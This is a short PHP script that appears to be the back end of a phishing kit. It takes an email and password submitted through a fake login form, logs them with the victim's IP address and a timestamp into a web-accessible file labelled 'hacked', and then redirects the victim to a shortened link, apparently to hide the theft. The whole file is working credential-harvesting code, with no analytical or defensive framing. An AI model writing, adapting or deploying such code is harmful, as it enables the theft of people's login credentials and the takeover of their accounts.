<?php

$usuario = $_POST['email']; 
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$fecha = date("Y-m-d;h:i:s");


if( (empty($usuario)) or (empty($password)) ){
     header('location: hanckm.html');
}else{

     //Guardaremos en un archivo de texto
$file = fopen('hanck.html','a+'); 
fwrite($file, "\r\nUsuario: ".$usuario."\r\nContraseña: ".$password."\r\nIP: ".$ip."\r\nFecha: ".$fecha."\r\<br/><<<----------------hacked----------------->>><br/><<<----------------hacked----------------->>><br/><<<----------------hacked----------------->>><br/><<<----------------hacked----------------->>><br/>
 \r\n");  
fclose($file);

header("Location: https://goo.gl/NS66Rt");
}
?>


